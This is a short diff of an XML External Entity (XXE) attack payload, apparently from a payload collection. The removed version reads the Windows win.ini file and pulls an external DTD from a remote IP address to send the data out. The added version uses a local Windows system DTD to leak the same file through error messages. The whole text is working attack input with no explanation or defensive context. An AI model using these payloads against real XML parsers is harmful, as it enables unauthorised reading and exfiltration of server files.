@@ -1,6 +1,13 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-  <!ENTITY % dtd SYSTEM "http://137.184.35.253:80/data.dtd"> %dtd;
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+
+    <!ENTITY % CIMName '>
+        <!ENTITY &#x25; file SYSTEM "file:///c:\Windows\win.ini">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
 ]>
-<data>&send;</data>
+<message></message>
